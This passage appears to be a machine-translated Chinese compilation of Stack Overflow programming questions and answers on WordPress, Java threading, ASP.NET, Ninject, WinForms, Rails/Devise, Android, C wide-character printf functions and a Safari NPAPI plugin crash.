} 
```

# wordpress - 父类别中页面的下拉菜单

> ID：10446709
> 
> 赞同：0
> 
> 时间：2012-05-04T10:03:04.530
> 
> 标签：wordpress

回复：Wordpress - 我想创建一个标准`<select>`下拉菜单，列出指定父类别中的子页面。

我想将此插入页面，而不是插入我的模板中。我可以使用某个短代码吗？

非常感谢！:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T12:38:30.767

不，您需要制作模板，或注册自己的简码
[http://codex.wordpress.org/Shortcode_API](http://codex.wordpress.org/Shortcode_API)

# java - 在 Java 中，如何创建线程以便每个线程专门在一个内核中运行？

> ID：10446710
> 
> 赞同：4
> 
> 时间：2012-05-04T10:03:13.780
> 
> 标签：java, multithreading, cpu

> **可能重复：**
> [Java 线程亲和性](https://stackoverflow.com/questions/2238272/java-thread-affinity)

我有一台服务器，它有一个 16 核 CPU。

在Java中，我需要创建一些线程（线程数小于16）。每个线程都需要运行一些操作，例如，处理一个事件队列。

如何创建这些线程以保证每个线程永远分配给一个核心？我的意思是我不希望操作系统为一个线程交换内核。我只希望一个线程专门在固定核心上运行。

我可以这样做吗？

* * *

我想要这个的原因是

我在同一台服务器上处理一些后台任务（计算密集型）和一些面向用户的任务。我不希望用户方面受到任何负面影响。例如，如果我的计算任务分配给 16 核，那么运行在用户端的线程肯定会受到负面影响，对吧？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-04T10:05:34.233

你不能。JVM 虚拟化了所有硬件，所以你不能做这样的事情。

可能有一些“技巧”可以在某些特定的体系结构和某些特定的 JVM 上工作，但这都是不可靠且不可靠的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-04T10:18:24.750

不要在这上面浪费您宝贵的开发时间。修复一些其他问题。如果操作系统核心管理所花费的时间对您的应用程序来说是一个问题，那么它无论如何都在失败的边缘徘徊。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-04T10:06:54.583

不，您不能这样做，因为 OS 调度程序旨在将线程分配给内核。运行您的 Java 应用程序的 JVM 无权访问它。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-04T10:08:57.980

你不应该。

如果你真的想，你可以使用本机调用：[Java thread affinity](https://stackoverflow.com/questions/2238272/java-thread-affinity)

但实际上，一定要有充分的理由这样做。为什么你认为这是个好主意？

# c# - LinkBut ton 无法正常工作。更改我的网页的顶部和左侧面板布局

> ID：10446711
> 
> 赞同：0
> 
> 时间：2012-05-04T10:03:19.593
> 
> 标签：c#, asp.net, linkbutton

我尝试使用 LinkBut​​ton 将“上一个”“主页”和“下一个”添加到我的网页，一旦我点击了链接，它就可以正常工作，但它改变了我网站的布局，取出所有可用的我的网页顶部和左侧面板上的菜单项。

我试图在没有为 LinkBut​​ton 分配事件处理程序的情况下运行它。单击链接时，我的内容布局没有改变，但顶部和左侧面板发生了变化。很奇怪吧？

任何人都面临类似的问题？

```
previous = new LinkButton();
next = new LinkButton();
home = new LinkButton();

previous.Text = "Previous";
previous.Click += Show_Previous;

next.Text = "Next";
next.Click += Show_Next;

home.Text = "Home";
home.Click += Show_Home; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T11:49:27.883

如果这些链接按钮在您的母版页中，则在您的 masterpage_load 事件中，如果页面 ISPOSTBACK，您应该清除这些链接按钮，然后您应该创建新的链接按钮！我认为您的页面布局发生变化的原因是您一次又一次地获得新的链接按钮元素！

如果这些按钮在简单页面或内容页面中，如果页面不是回发，则创建您的链接按钮，并且在每次回发时重新分配点击值！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-05T17:48:24.687

通过将 LinkBut​​ton 更改为 Button 解决了它。（快速解决方案）

我不明白，它适用于 ImageButton 和 Button。但是当涉及到 LinkBut​​ton 时，它会改变我的布局。

只是为了好奇，还有什么和 LinkBut​​ton 一样的吗？超链接可以解决问题吗？

我看到一些网站使用 c# asp 来做我正在做的事情。但没有“下一个”/“上一个”链接文本调用 javascript 的“_doPostBack”函数。任何想法？

# iphone - 在 twitter 上发送格式化的推文：iphone sdk

> ID：10446722
> 
> 赞同：0
> 
> 时间：2012-05-04T10:04:02.573
> 
> 标签：iphone, twitter, twitter-oauth

我想在 Twitter 上的推文中发送详细信息。那么我可以添加 html 标签来显示该消息吗？有什么方法可以在 [_engine sendUpdate:xyz] 中发送详细信息；??

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T10:12:40.160

Twitter 不支持富文本消息。您允许 140 个纯文本。

# ios - 复数应用程序 - 用核心图、幂图或其他方式绘图？

> ID：10446724
> 
> 赞同：1
> 
> 时间：2012-05-04T10:04:06.213
> 
> 标签：ios, graphics, core-plot, graphing

我正在编写将向用户解释复数的 iOS 应用程序。复数可以在笛卡尔坐标中显示，这就是我想要做的；在屏幕上打印一个或多个矢量。

我正在寻找将 3 个矢量打印到坐标系中的最简单方法，该坐标系将自行调整为矢量大小（如果 x-coord > y-coord 将两个轴都调整为 x-coord，反之亦然）。

我尝试使用 Core Plot，我认为它对于我的目的来说太多功能了。现在我正在使用 PowerPlot，我的坐标系看起来已经不错了，但我仍然遇到一些问题（x 轴和 y 轴设置为 x 和 y 值，这会导致 45 度角线，无论用户输入如何）。

CorePlot 和 PowerPlot 中示例的功能似乎不能满足我的需求。

我的最后两种方法是使用 HTML 和 web 视图，并使用 Quartz 自己完成（不是简单的方法......）

你有什么建议如何以简单的方式做到这一点，因为这是一个简单的问题，我猜？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T10:24:22.650

如果您不想做太多实际的绘图和绘图，那么使用 Core Plot 或类似的东西对我来说听起来有点矫枉过正。将 coreplot 添加到您的项目中的额外膨胀，更不用说您了解如何使用它所花费的时间，对于一些简单的图形来说可能不值得。

假设您对花哨的 3D 图形不感兴趣，Quartz 可以很好地在屏幕上显示一些矢量。有很多使用 Core Graphics (AKA Quartz) 绘制线条等的教程和示例。如果你要走 Quartz 路线，也许可以在 Quartz 中进行一些简单的线条绘制，然后在需要数学帮助时提出更多问题它的一个方面。

使用 Quartz 进行渲染时使用的典型技术是在`drawRect`其中覆盖`UIView`并调用 Core Graphics 绘图函数。

一个体面的问题和石英线图的例子在这里：

[如何在 iPhone 上画线？](https://stackoverflow.com/questions/856354/how-do-i-draw-a-line-on-the-iphone)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-16T19:28:39.350

如果您不反对使用 Google [Chart Image](https://developers.google.com/chart/image/)，您可以通过调用适当的 URL 然后将图像放入 UIImageView 以简单的方式加载相当复杂的数据集。它只需要很少的代码：这是一个带有示例代码的[博客文章解释。](http://vanappdeveloper.com/2012/07/16/easily-creating-charts-on-ios-using-google-image-charts-url-api/)

限制是

*   数据集的长度受您可以从 Google 请求的最大 URL 长度（2048 个字符，编码很大）的限制，尽管我已经绘制了 4 个系列的 120 个数据点。
*   需要网络连接（至少要获得初始图表）
*   也许最大的问题是，API 已被弃用，并将在 2015 年的某个时候停止使用。然后，您将不得不切换到 UIWebView/Javascript Google Chart API 实现......

* * *

示例图片：

![在此处输入图像描述](../Images/08fcd1dfd6c9a3b99e8ddfefa65f26cf.png)

# android - 在 Android 上为 3D 动画选择哪个框架？

> ID：10446733
> 
> 赞同：0
> 
> 时间：2012-05-04T10:04:39.850
> 
> 标签：android, animation, opengl-es, frameworks, 3d

我开始开发一个 Android 应用程序，我想在启动时运行一个 3D 动画，以 3D 显示一辆汽车。这将是我的第一次体验，因此我想知道我必须使用什么框架？我听说过 min3D，但找不到文档来指导我从 A 到 Z 的开发

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-09T10:39:20.667

由于您还询问了有关选择框架的问题，因此我想推荐一个比 min3d 多的框架。看看 Rajawali 框架。

[这里](https://github.com/MasDennis/Rajawali#tutorials)有大量 Rajawali 教程。您也可以从 github下载[带有示例的 Android 项目。](https://github.com/MasDennis/RajawaliExamples)

我对这个图书馆印象深刻！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T10:16:30.403

如何使用 min3D 加载 3D 模型，教程：[见此链接](http://www.mat-d.com/site/tutorial-load-a-3d-obj-model-with-min3d-for-android/)

您还可以看到这个项目，它似乎针对您的相同目标来源也附加了，随时关注它并获得一些好处。[min3d 车](http://www.youtube.com/watch?v=tiM_liSVP7U&feature=results_main&playnext=1&list=PL91309EA881B7FDAC)

# asp.net-mvc-3 - 如何使用 Ninject 注入一些通用的 asp.net http 处理程序？

> ID：10446737
> 
> 赞同：7
> 
> 时间：2012-05-04T10:04:58.257
> 
> 标签：asp.net-mvc-3, ninject, generic-handler

我是使用 Ninject 的新手，我不知道如何注入我的通用 http 处理程序。我有一个 MVC3 项目，我将我的服务注入到控制器中，完全没有问题。这是我在 Ninject App_start 类中注册服务的内容：

```
 private static void RegisterServices(IKernel kernel)
    {
        kernel.Bind<NLSubscriber.Core.Service.Repository.INLUserRepository>().To<NLSubscriber.Core.Service.Repository.EFDAL.EFNLUserRepository>().InRequestScope();
        kernel.Bind<Neticon.Mvc.Helpers.IConfigHelper>().To<Neticon.Mvc.Helpers.AzureEnabledConfigHelper>().InSingletonScope();
        kernel.Bind<Neticon.Security.Service.IAuthenticationService>().ToMethod(m => Neticon.Security.Service.SecurityServiceFactory.CreateAuthenticationService()).InRequestScope();
        kernel.Bind<Neticon.Security.Service.IMembershipService>().ToMethod(m => Neticon.Security.Service.SecurityServiceFactory.CreateMembershipService()).InRequestScope();
        kernel.Bind<Neticon.Security.Service.IRoleManagerService>().ToMethod(m => Neticon.Security.Service.SecurityServiceFactory.CreateRoleManagerService()).InRequestScope(); 
```

当我尝试通过使用属性注入（带有 [inject] 属性）从我的通用处理程序中获取一些服务时，我总是得到空值。这就是我的处理程序的样子：

```
 public class SubscriberHandler : IHttpHandler
{
    [Inject]
    public INLUserRepository userRep { get; set;}

    public void ProcessRequest(HttpContext context)
    {
        var users = userRep.GetUsers(); //userRep is always null here
    }

    public bool IsReusable
    {
        get
        {
            return false;
        }
    }
} 
```

我也试过这样做：

```
 readonly INLUserRepository userRep;

    public SubscriberHandler()
    {

        using (IKernel kernel = new StandardKernel(new App_Start.NJRepositoryModule()))
        {
            userRep = kernel.Get<INLUserRepository>();
        }
    } 
```

但我得到一个异常：“加载Ninject组件ICache时出错。内核的组件容器中没有注册这样的组件。建议：1）如果您为KernelBase创建了自定义子类，请确保您已正确实现AddComponents（ ) 方法。2) 确保您没有通过调用 RemoveAll() 从容器中删除组件。3) 确保您没有意外创建多个内核。"

这表明我不应该在我的应用程序中实例化多个内核，对吧？我究竟做错了什么？谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-04T10:07:23.247

您可以使用依赖解析器：

```
public class SubscriberHandler : IHttpHandler
{
    public INLUserRepository userRep { get; private set; }

    public SubscriberHandler()
    {
        userRep = DependencyResolver.Current.GetService<INLUserRepository>();
    }

    public void ProcessRequest(HttpContext context)
    {
        var users = userRep.GetUsers(); //userRep is always null here
    }

    public bool IsReusable
    {
        get
        {
            return false;
        }
    }
} 
```

我希望从这个答案中得到负面反馈，因为服务定位器模式被许多人视为反模式。

但我不确定 NInject 是否允许您对 HTTP 处理程序使用构造函数注入，因为它们是由 ASP.NET 运行时实例化的。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-04T10:47:46.977

s的合成根`IHttpHandler`是`IHttpHandlerFactory`。您可以创建一个自定义 [`IHttpHandlerFactory`](http://msdn.microsoft.com/en-us/library/ms227439.aspx)，使用 Ninject 创建您的`IHttpHandler`. 这样你就可以使用构造函数注入。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-10-31T17:30:16.270

我看到您的代码段中有一个“RegisterServices”方法，这表明您已经在使用 Ninject.Web.Common。你可能不知道 NinjectWebCommon.cs 是它使用一个 Bootstrapper 类，其中包含 Ninject 内核的单例实例。

正如上面提到的 Remo，IHttpHandlerFactory 是 IHttpHandler 实例的组合根，因此您需要创建此接口的实现并将必要的配置元素添加到您的 web.config。

**MyHandlerFactory.cs：**

```
public class MyHandlerFactory : IHttpHandlerFactory
{
    public bool IsReusable => false;

    public IHttpHandler GetHandler(HttpContext context, string requestType, string url, string pathTranslated)
    {
       // the bootstrapper class uses the singleton pattern to share the Ninject Kernel across your web app's ApplicationDomain
       var kernel = new Bootstrapper().Kernel;

       // assuming you have only one IHttpHandler binding in your NinjectWebCommon.cs
       return kernel.Get<IHttpHandler>();
    }

    public void ReleaseHandler(IHttpHandler handler)
    {
       // nothing to release
    }
} 
```

现在，为您的新处理程序工厂添加必要的配置元素...

**网络配置：**

```
 <system.web>
    <httpHandlers>
      <add verb="GET" path="*.customThingImade" type="MyNamespace.MyHandlerFactory, MyAssemblyWhereIPutMyHandlerFactory, Version=1.0.0.0, Culture=neutral" />
    </httpHandlers>
  </system.web>
  <system.webServer>
    <handlers>
      <add name="MyHandlerFactory" verb="GET" path="*.customThingImade" type="MyNamespace.MyHandlerFactory, MyAssemblyWhereIPutMyHandlerFactory, Version=1.0.0.0, Culture=neutral" preCondition="integratedMode" />
    </handlers>
  </system.webServer> 
```

最后，为您的 IHttpHandler 实现添加一个绑定...

**NinjectWebCommon.cs：**

```
private static void RegisterServices(IKernel kernel)
{
    kernel.Bind<NLSubscriber.Core.Service.Repository.INLUserRepository>().To<NLSubscriber.Core.Service.Repository.EFDAL.EFNLUserRepository>().InRequestScope();
    kernel.Bind<Neticon.Mvc.Helpers.IConfigHelper>().To<Neticon.Mvc.Helpers.AzureEnabledConfigHelper>().InSingletonScope();
    kernel.Bind<Neticon.Security.Service.IAuthenticationService>().ToMethod(m => Neticon.Security.Service.SecurityServiceFactory.CreateAuthenticationService()).InRequestScope();
    kernel.Bind<Neticon.Security.Service.IMembershipService>().ToMethod(m => Neticon.Security.Service.SecurityServiceFactory.CreateMembershipService()).InRequestScope();
    kernel.Bind<Neticon.Security.Service.IRoleManagerService>().ToMethod(m => Neticon.Security.Service.SecurityServiceFactory.CreateRoleManagerService()).InRequestScope();

    // the binding for your handler factory
    Bind<IHttpHandler>().To<SubscriberHandler>();
} 
```

# c# - 如何获取datagridviewcomboboxcolumn的ValueMember的值

> ID：10446739
> 
> 赞同：1
> 
> 时间：2012-05-04T10:05:21.277
> 
> 标签：c#, winforms, datagridviewcombobox, valuemember

朋友们，我在 datagridview 中使用 datagridviewcomboboxcolumn 作为列索引 1。我已经从访问数据库表中获取数据并通过以下方式填充了 datagridviewcomboboxcolumn：

```
 for (int i = 0; reader.Read(); i++)
        {
            cmbBusCode.Items.Add(reader["BUSINESS_CODE"] + "-" + reader["BUSINESS_DESCRIPTION"]);
            cmbBusCode.ValueMember = "BUSINESS_CODE";
        } 
```

然后我写这个：

```
 cmbBusCode.DisplayIndex = 1;
        cmbBusCode.Width = 200;
        cmbBusCode.Name = "Code";
        cmbBusCode.HeaderText = "Code"; 
```

并将此列添加为

```
 dgView.Columns.Add(cmbBusCode); 
```

正在填充组合框，我可以从列表中选择任何一个。现在，当我保存数据时，我想获取所选项目的 ValueMember。为了获得这个值，我使用了以下代码，但它给出了字段“BUSINESS_CODE”的字符串表示，而不是值。请帮助我，以便获取所选项目的 ValueMemeber 。

```
 foreach (DataGridViewRow row in dgView.Rows)
    {
        string cd = row.Cells["Code"].Value.ToString();
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T10:11:48.087

您添加到该列的“项目”没有“BUSINESS_CODE”列（本质上，您添加的项目只是一个字符串），所以这不起作用。

您需要做的是分配包含多列的项目。一个必须是`BUSINESS_CODE`列（因为您希望此列成为 中基础字段的值`DataGridView`），另一个应该是包含您当前添加的连接值的显示列（`DisplayMember`和`ValueMember`）。

最简单的方法是创建一个类型化的数据集，添加一个包含我描述的两列的表，然后用来自数据读取器的数据填充该表。

然后，将表添加为列的数据源。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-05-04T10:18:31.770

您可以尝试将 a`DataGridViewComboBoxCell`而不是 a添加`string`到`cmbBusCode.Items`集合中。然后您可以`Value`在单元格中指定。我不确定这是否可行，但值得一试。

# ruby-on-rails-3 - size: 属性在这段代码中有什么作用？

> ID：10446749
> 
> 赞同：0
> 
> 时间：2012-05-04T10:06:11.490
> 
> 标签：ruby-on-rails-3

```
module UsersHelper

  # Returns the Gravatar (http://gravatar.com/) for the given user.
  def gravatar_for(user, options = { size: 10 })
    gravatar_id = Digest::MD5::hexdigest(user.email.downcase)
    size = options[:size]
    gravatar_url = "http://gravatar.com/avatar/#{gravatar_id}.png?s=#{size}"
    image_tag(gravatar_url, alt: user.name, class: "gravatar")
  end
end 
```

我已经使用了这段代码，并假设它会改变 gravatar 的大小，但它似乎对它没有影响？我错过了什么吗？我还尝试将视图中的值更改为：

```
<%= gravatar_for @user, size: 10 %>
<%= @user.name %> 
```

看看这是否改变了什么，无济于事。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-06-26T19:12:37.870

假设您的帮助模块如下

```
module UsersHelper

   # Returns the Gravatar (http://gravatar.com/) for the given user.
  def gravatar_for(user, options = { size: 50 })

    gravatar_id = Digest::MD5::hexdigest(user.email.downcase)

    size = options[:size]

    gravatar_url = "https://secure.gravatar.com/avatar/#{gravatar_id}?s=#{size}"

    image_tag(gravatar_url, alt: user.name, class: "gravatar")

  end

end 
```

然后在视图中传递您的尺寸

```
<%= gravatar_for @user, :size => 30 %> 
```

# android - 如何从 Webservice 检索消息

> ID：10446750
> 
> 赞同：-2
> 
> 时间：2012-05-04T10:06:15.707
> 
> 标签：android, web-services

嗨，我在应用程序上工作，其中消息是从中检索的`web service`。网络服务会给出类似的响应`(contactnumber + "##" + message + "##" + Username)`。我想在手机中存储类似收件箱的消息。请任何人给我一些想法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T10:18:16.067

**第 1** *步：使用 HttpGet 获取 Web 消息，如下所示：*

```
HttpClient client = new DefaultHttpClient();
HttpGet request = new HttpGet();
request.setURI(new URI("YOUR_WEB_SERVCE"));
HttpResponse response = client.execute(request);
in = new BufferedReader
(new InputStreamReader(response.getEntity().getContent()));
StringBuffer sb = new StringBuffer("");
String line = "";
String NL = System.getProperty("line.separator");
while ((line = in.readLine()) != null) {
sb.append(line + NL);
}
in.close();
String webmesg = sb.toString(); 
```

**第2步：**

使用 TelephonyManager 获取您自己的手机号码：

```
TelephonyManager tm = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
String strmobinum= tm.getLine1Number(); 
```

*AndroidManifest.xml：*

```
<uses-permission android:name= "android.permission.READ_PHONE_STATE"/> 
```

**第 3 步：**

*使用 SmsManager 发送短信：*

```
SmsManager smsManager = SmsManager.getDefault();
smsManager.sendTextMessage(strmobinum, null, webmesg, null, null); 
```

*AndroidManifest.xml：*

```
<uses-permission android:name="android.permission.SEND_SMS"/> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T10:11:59.440

那么你将有 3 个步骤：1）使用 http 请求联系 web 服务（你会找到很多关于如何做到这一点的教程） 2）解析响应（在你的情况下你拆分字符串，但它不是很健壮......） 3 ) 将消息存储在您想要的位置（请更准确地确定要存储的位置）

# c - linux 上的 vsnwprintf 替代方案

> ID：10446754
> 
> 赞同：1
> 
> 时间：2012-05-04T10:06:31.983
> 
> 标签：c, gcc, unicode

linux机器上该功能的直接替代方案是`vsnwprintf`什么，应该包含哪些标头才能使用它？

感谢您的任何建议

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T10:14:16.090

`snprintf`此函数的Linux 变体由以下`vsnprintf`机构友情提供`stdio.h`：

```
int snprintf(char *str, size_t size, const char *format, ...);
int vsnprintf(char *str, size_t size, const char *format, va_list args); 
```

和 Unicode 版本由`wchar.h`：

```
int swprintf(wchar_t *wcs, size_t maxlen, const wchar_t *format, ...);
int vswprintf(wchar_t *wcs, size_t maxlen, const wchar_t *format, va_list args); 
```

[http://linux.die.net/man/3/snprintf](http://linux.die.net/man/3/snprintf)
[http://linux.die.net/man/3/swprintf](http://linux.die.net/man/3/swprintf)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-04T10:16:43.043

这取决于`vsnwprintf()` *（原文如此）*做什么以及它的参数列表是什么。

[C99 标准](http://www.open-std.org/JTC1/sc22/wg14/www/docs/n1256.pdf)描述（在第[`vswprintf()`](http://pubs.opengroup.org/onlinepubs/9699919799/functions/vswprintf.html)7.24.2.7 节中）。要使用它，您需要 #include`<stdarg.h>`和`<wchar.h>`. 实现应该在标准库中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-09-19T00:02:19.600

没有其他选择。

其他答案中建议的 vswprintf 并未说明所需的缓冲区长度。当您将 nullptr 和 0 传递给前两个参数时，它将返回 -1，而不是所需的缓冲区长度。这既是它的[记录](http://www.cplusplus.com/reference/cwchar/vswprintf/)方式，也是它在 clang 4 中的实际工作方式。

该答案中有一个解决方法 [https://stackoverflow.com/a/16352146/126995](https://stackoverflow.com/a/16352146/126995) 滚动到 vscwprintf 源代码的末尾。该解决方法适用于小字符串，但对于较大的字符串相对较慢，甚至可能会耗尽非常大的字符串的堆栈空间。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-12-25T10:37:49.327

似乎 libicu 中的[u_vsnprintf()](http://icu-project.org/apiref/icu4c/ustdio_8h.html#aae7e44a6233404268c4ed2eebd661140)或[u_vsnprintf_u()](http://icu-project.org/apiref/icu4c/ustdio_8h.html#a2326d587dca4871d238a0d64e05ea7a4)是您需要的

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-09-04T08:57:35.323

的截断版本`vswprintf()`是不安全的。你真的想要 C11 `vswprintf_s()`，它确保一个空分隔的宽字符串，并且在目标缓冲区太小时时出错。

如您所知，宽变体没有 API 来计算 NULL 缓冲区的大小。如果缓冲区太小，您需要在错误时扩展缓冲区。

无论如何，**safeclib-3.0**将提供所有这些。安全和不安全与 --enable-unsafe、宽或非宽、截断 ('n') 或不截断。 [https://github.com/rurban/safeclib/blob/wchar/src/wchar/vsnwprintf_s.c](https://github.com/rurban/safeclib/blob/wchar/src/wchar/vsnwprintf_s.c)

`vsnwprintf`在 C99、MSVC 和其他一些中。不是肌肉。 `-stc=c99`对于 glibc 应该足够了。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2022-01-29T04:53:37.080

这是解决方法的示例：

```
 int vsnwprintf(wchar_t* buffer, size_t size, const wchar_t* format, va_list& params)
  {
    if(buffer || size)
      return vswprintf(buffer, size, format, params);

    int result = -1;
    for(size = 100; result < 0; size += 100)
    {
      unique_ptr<wchar_t[]> guard(buffer = new wchar_t[size]);
      va_list copy;
      va_copy(copy, params);
      result = vswprintf(buffer, size, format, copy);
      va_end(copy);
    }

    return result;
  }; 
```

可能需要以某种方式限制迭代次数。

# ruby-on-rails - 在登录期间优雅地处理设计 401

> ID：10446760
> 
> 赞同：3
> 
> 时间：2012-05-04T10:07:20.083
> 
> 标签：ruby-on-rails, devise

我为设计用户提供了一个非常简单的登录页面。提交不正确的数据后，日志显示“401 Unauthorized”并将我重定向回登录页面。我想不出一种向用户显示错误消息的方法。

我看了一下`devise::sessions_controller#create`是这样的，

```
 # POST /resource/sign_in
  def create
    resource = warden.authenticate!(auth_options)
    set_flash_message(:notice, :signed_in) if is_navigational_format?
    sign_in(resource_name, resource)
    respond_with resource, :location => after_sign_in_path_for(resource)
  end

  def auth_options
    { :scope => resource_name, :recall => "#{controller_path}#new" }
  end 

```

如果身份验证失败，流程会中断，`warden.authenticate`并且用户会被重定向到“新”页面，即登录页面。

我只需要向用户显示一个 invalid_credentials 工具提示/flash_message。所以我通过修改身份验证失败的时间来做到这一点，我在其中设置了错误消息。`:recall => "#{controller_path}#handle_create_fail" (look at `auth_options`) which calls handle_create_fails`

我不确定我是否忽略了设计已经提供的东西。

我怎样才能更好地处理这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T12:47:56.653

'devise' 将错误消息存储在 rails 'flash' 中，`flash[:notice]`用于成功消息和`flash[:alert]`问题。

这是[设计文档](https://github.com/plataformatec/devise)中的内容：

> 请记住，Devise 使用 Flash 消息让用户知道登录是成功还是失败。Devise 希望您的应用程序酌情调用“flash[:notice]”和“flash[:alert]”。

这意味着在您的视图文件（或更一般地在您的应用程序布局文件中）中，您应该包含类似于以下几行的内容：

```
<%= content_tag(:div, flash[:error], :id => "flash_error") if flash[:error] %>
<%= content_tag(:div, flash[:notice], :id => "flash_notice") if flash[:notice] %>
<%= content_tag(:div, flash[:alert], :id => "flash_alert") if flash[:alert] %> 
```

以下是一些类似的问题/答案：

[Rails - 设计 - 登录时出现错误消息？](https://stackoverflow.com/questions/4635986/rails-devise-error-messages-when-signing-in)

[设计错误显示两次](https://stackoverflow.com/questions/6404412/devise-errors-are-displayed-twice)

[设计 - 自定义用户编辑页面](https://stackoverflow.com/questions/4101979/devise-customizing-the-user-edit-pages)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T12:36:13.077

我不确定我是否正确理解了您，但只需在您的视图中放置“警报”（sign_in.html.erb），Devise 就会闪现错误消息。

```
<div class="alert">
  <%= alert %>
</div> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T04:18:17.387

我希望能够做一些类似的事情，就像您在大多数 Rails 表单上可能遇到的特定于表单的错误消息（而不是布局范围的全局闪存）。

你可以在这个 Github gist 中查看我的想法：[https ://gist.github.com/3792471](https://gist.github.com/3792471)

基本上（下面的注释假设设计范围为`:user`）：

*   添加/使用`FailureApp`由 devise+warden 使用的 custom ，它只是添加了一个“范围” `flash`“指标”。也就是说，如果 devise+warden 由于登录失败而快速退出，因此设置了`flash.now[:alert]`, 添加`flash.now[:user] = [:alert]`
*   扩展`FormBuilder`（实际上，`SimpleForm::FormBuilder`在我的主旨中，但应该与其他人一起使用）以添加一个`#flash`方法，该方法检查范围指示符。如果找到，则从 中提取/删除匹配项`FlashHash`并进行渲染。如果未找到（即，`flash[:alert]`可能存在也可能不存在，但`flash[:user]`不存在或不包含`:alert`），则不执行任何操作，以便闪存可用于默认用例。
*   向相关视图/布局添加渲染。

请注意，我的示例 gist 中的布局没有围绕布局呈现的 flash 消息的条件逻辑。我这样做只是为了我可以测试看看在各种情况下会出现什么和不出现什么。

# windows-7 - docx 文件图标在我的 windows7 电脑中显示不同？

> ID：10446765
> 
> 赞同：0
> 
> 时间：2012-05-04T10:07:39.523
> 
> 标签：windows-7, ms-word, word-2007, word-2003

我有我的 Windows 7 机器。但在我的电脑中，doc 和 docx 的图标显示不同。我还附上了屏幕截图供您参考。

![在此处输入图像描述](../Images/e2f7148d9c23e67117258e93c3d89464.png)

1.  我已将 doc 文件保存为类型 word97-2003 Document(*.doc)[在另存为对话框中另存为类型]
2.  还将 docx 文件保存为 Word 文档类型（*.docx）[在另存为对话框中另存为类型]

当我以编程方式访问 docx 文件时，如果它在这种图标中，它将引发一些异常。否则它工作正常。

我不知道如何将这个图标改回原来的 word2007 图标。请指导我摆脱这个问题？

# macos - Safari 插件在 NPN_GetValue 上崩溃

> ID：10446766
> 
> 赞同：0
> 
> 时间：2012-05-04T10:07:44.037
> 
> 标签：macos, safari, npapi

当我调用 NPN_GetValue 时，我的插件代码崩溃。基本上，我创建了一个可编写脚本的对象，它有一个“getDevice”方法，可以将设备数组返回给 JavaScript。下面是代码片段。

```
static bool mainNPObjectInvoke(NPObject *obj, NPIdentifier identifier, const NPVariant *args, uint32_t argCount, NPVariant *result)
{
    printf("create main object");
    MainNPObject *mainObject = (MainNPObject *)obj;

    if (identifier == methodIdentifiers[METHOD_ID_GET_DEVICES])
    {
        NPObject *windowObj = NULL;
        browser->getvalue(mainObject->npp, NPNVWindowNPObject, &windowObj);
        // it crashed here
    ....
    }
} 
```

我用下面的方法创建了 MainNPObject 实例。

```
NPObject *createMainNPObject(NPP npp)
{
    MainNPObject *object = (MainNPObject *)browser->createobject(npp, &mainNPClass);
    object->npp = npp;

    theMainObject = object;

    return (NPObject *)object;
} 
```

createMainNPObject 在我提供给浏览器的插件函数中被调用。

```
NPError NPP_GetValue(NPP instance, NPPVariable variable, void *value)
{
    PluginObject *obj = instance->pdata;

    switch (variable) {
        case NPPVpluginCoreAnimationLayer:
            if (!obj->rootLayer)
                setupLayerHierarchy(obj);

            *(CALayer **)value = obj->rootLayer;

            return NPERR_NO_ERROR;

        case NPPVpluginScriptableNPObject:

            if (!obj->mainObject)
            {
                obj->mainObject = createMainNPObject(instance);
            }
 ....
} 
```

分配功能如下。

```
static NPObject *mainNPObjectAllocate(NPP npp, NPClass *class)
{
    initializeIdentifiers();

    MainNPObject *mainObject = malloc(sizeof(MainNPObject));
    mainObject->deviceManager = [[DeviceManager alloc] init];

    return (NPObject *)mainObject;
} 
```

MainNPObject 的定义：

```
typedef struct
{
    NPObject *npobject;
    NPP npp;
    DeviceManager *deviceManager;
} MainNPObject; 
```

通过调试代码，发现系统在调用browser->getValue时抛出了EXC_BAD_ACCESS，看起来npp指针无效。

```
0x00007fff83f82dab  <+0019>  je     0x7fff83f82db9 <_ZN6WebKit14NetscapePlugin7fromNPPEP4_NPP+33>
0x00007fff83f82dad  <+0021>  incl   0x8(%rax) 
```

有人可以帮我吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-05T05:25:42.380

唔; 没有看到任何明显的东西。尝试向您的结构添加另一个参数（一个 int？）并在分配期间或紧随其后设置它，然后稍后检查它是否仍然是您在调用 getvalue 之前设置的值。查看您的结构是否以某种方式损坏。当我以一种不明显的方式使 NPObject 变得有趣时，这发生在我身上一次。

# java - Jython PyList 映射到 List 和其他 Jython 到 Java 变量的映射

> ID：10446771
> 
> 赞同：1
> 
> 时间：2012-05-04T10:08:13.143
> 
> 标签：java, python, list, jython

